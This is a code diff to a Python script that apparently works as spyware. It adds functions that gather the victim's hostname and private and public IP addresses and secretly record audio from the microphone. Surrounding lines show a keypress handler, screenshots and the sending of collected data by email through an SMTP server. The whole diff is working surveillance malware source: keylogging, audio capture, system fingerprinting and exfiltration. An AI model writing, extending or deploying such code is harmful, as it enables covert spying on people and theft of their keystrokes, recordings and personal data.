@@ -16,8 +16,6 @@ from datetime import datetime
 import socket
 import platform
 
-import win32clipboard
-
 from scipy.io.wavfile import write
 import sounddevice as sd
 import getpass
@@ -67,6 +65,38 @@ with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
     server.sendmail(sender_email, receiver_email, text)
 
 
+# get the computer information
+def computer_information():
+    with open("systeminfo.txt", "a") as f:
+        hostname = socket.gethostname()
+        ipaddr = socket.gethostbyname(hostname)
+        try:
+            public_ip = get("https://api.ipify.org").text
+            f.write("Public IP Address: " + public_ip)
+
+        except Exception as e:
+            f.write(str(e))
+
+        f.write("Processor: " + (platform.processor()) + '\n')
+        f.write("System: " + platform.system() + " " + platform.version() + '\n')
+        f.write("Machine: " + platform.machine() + "\n")
+        f.write("Hostname: " + hostname + "\n")
+        f.write("Private IP Address: " + ipaddr + "\n")
+
+
+computer_information()
+
+
+def microphone():
+    fs = 44100
+    seconds = 5
+
+    recording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
+    sd.wait()
+
+    write("audio.wav", fs, recording)
+
+
 # TODO: Fix special keys
 def on_press(key):
     global keys
@@ -74,6 +104,7 @@ def on_press(key):
     k = str(key).replace("'", "")
 
     # TODO: Fix functionality for when to take the screenshot
+    # TODO: Fix when to start recording audio with microphone()
     # TODO: fix invalid argument for OS
     if key == keyboard.Key.esc:
         screenshot(str(datetime.now().strftime("%Y-%m-%d %H:%M:%S")) + '.png')
